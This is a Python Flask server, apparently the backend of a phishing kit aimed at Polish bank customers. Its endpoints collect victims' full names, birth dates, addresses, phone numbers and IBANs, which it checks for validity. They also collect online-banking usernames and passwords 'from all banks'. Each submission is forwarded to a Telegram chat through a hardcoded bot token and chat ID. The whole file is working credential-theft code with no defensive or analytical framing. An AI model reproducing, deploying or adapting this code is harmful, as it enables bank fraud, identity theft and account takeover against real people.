from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from datetime import datetime
import re

app = Flask(__name__)
CORS(app)

# ===== КОНФИГУРАЦИЯ TELEGRAM =====
BOT_TOKEN = '8587138753:AAGeakLE3xKdj97gKZ0URBxYvTy2CbC8kPs'
CHAT_ID = '-1004256695843'


def send_to_telegram(message):
    """Отправка сообщения в Telegram"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        response = requests.post(url, json=payload, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram send error: {e}")
        return False


# ===== IBAN ВАЛИДАЦИЯ =====
def validate_iban(iban):
    """
    Проверка IBAN на валидность по стандарту ISO 13616.
    Поддерживает польские IBAN (PL) и другие страны.
    """
    if not iban:
        return False, "IBAN nie może być pusty"

    # Удаляем пробелы и приводим к верхнему регистру
    iban = iban.replace(' ', '').replace('-', '').upper()

    # Проверяем длину (минимум 15, максимум 34 символа)
    if len(iban) < 15 or len(iban) > 34:
        return False, f"Nieprawidłowa długość IBAN: {len(iban)} (powinno być 15-34)"

    # Проверяем, что первые 2 символа — буквы (код страны)
    if not iban[:2].isalpha():
        return False, "IBAN musi zaczynać się od kodu kraju (2 litery)"

    # Проверяем, что остальные символы — буквы или цифры
    if not re.match(r'^[A-Z]{2}[A-Z0-9]+$', iban):
        return False, "IBAN zawiera niedozwolone znaki"

    # Проверка контрольной суммы по алгоритму IBAN
    # 1. Первые 4 символа перемещаем в конец
    iban_rotated = iban[4:] + iban[:4]

    # 2. Заменяем буквы на цифры (A=10, B=11, ..., Z=35)
    numeric_iban = ''
    for char in iban_rotated:
        if char.isdigit():
            numeric_iban += char
        elif char.isalpha():
            numeric_iban += str(ord(char) - ord('A') + 10)

    # 3. Проверяем, что число делится на 97 без остатка
    try:
        if int(numeric_iban) % 97 != 1:
            return False, "Nieprawidłowa suma kontrolna IBAN"
    except ValueError:
        return False, "Nieprawidłowy format IBAN"

    # Дополнительная проверка для польских IBAN (PL)
    if iban.startswith('PL'):
        if len(iban) != 28:
            return False, f"Polski IBAN musi mieć dokładnie 28 znaków (ma {len(iban)})"
        # Проверяем, что после PL идут 2 цифры (контрольная сумма) и 24 цифры (код банка + номер счёта)
        if not re.match(r'^PL[0-9]{26}$', iban):
            return False, "Nieprawidłowy format polskiego IBAN (oczekiwano PL + 26 cyfr)"

    return True, "IBAN jest poprawny"


# ===== ОСНОВНОЙ ЭНДПОИНТ С IBAN-ПРОВЕРКОЙ =====
@app.route('/send', methods=['POST'])
def send_personal_data():
    """Основная форма (данные пользователя) с проверкой IBAN"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Brak danych'}), 400

        iban = data.get('iban', '').strip()

        # Проверяем IBAN перед отправкой
        is_valid, validation_message = validate_iban(iban)
        if not is_valid:
            return jsonify({
                'error': f'Błąd walidacji IBAN: {validation_message}',
                'iban_valid': False
            }), 400

        message = "📋 *Nowe dane osobowe:*\n\n"
        message += f"👤 *Imię i nazwisko:* {data.get('fullname', '')}\n"
        message += f"📅 *Data urodzenia:* {data.get('birthdate', '')}\n"
        message += f"📞 *Telefon:* {data.get('phone', '')}\n"
        message += f"🏠 *Ulica:* {data.get('street', '')}\n"
        message += f"🏙️ *Miasto:* {data.get('city', '')}\n"
        message += f"📮 *Kod pocztowy:* {data.get('postal', '')}\n"
        message += f"🏦 *IBAN:* `{iban}` ✅ (zweryfikowany)"

        success = send_to_telegram(message)
        return jsonify({
            'success': success,
            'iban_valid': True,
            'iban_message': validation_message
        })

    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/validate-iban', methods=['POST'])
def validate_iban_endpoint():
    """
    Отдельный эндпоинт для проверки IBAN без отправки в Telegram.
    Ожидает: { "iban": "PL..." }
    Возвращает: { "valid": true/false, "message": "..." }
    """
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Brak danych'}), 400

        iban = data.get('iban', '').strip()
        is_valid, message = validate_iban(iban)

        return jsonify({
            'valid': is_valid,
            'message': message,
            'iban': iban
        })

    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/send-login', methods=['POST'])
def send_login_data():
    """
    Эндпоинт для отправки логина и пароля со всех банков.
    Ожидает: { "bank": "Bank 1", "username": "user", "password": "pass" }
    """
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'Brak danych'}), 400

        bank = data.get('bank', 'Nieznany bank')
        username = data.get('username', '').strip()
        password = data.get('password', '').strip()

        if not username or not password:
            return jsonify({'error': 'Login i hasło są wymagane'}), 400

        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        message = "🔐 *Dane logowania do banku:*\n\n"
        message += f"🏦 *Bank:* {bank}\n"
        message += f"👤 *Login:* `{username}`\n"
        message += f"🔑 *Hasło:* `{password}`\n"
        message += f"🕐 *Czas:* {timestamp}"

        success = send_to_telegram(message)
        return jsonify({'success': success})

    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'ok'})


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)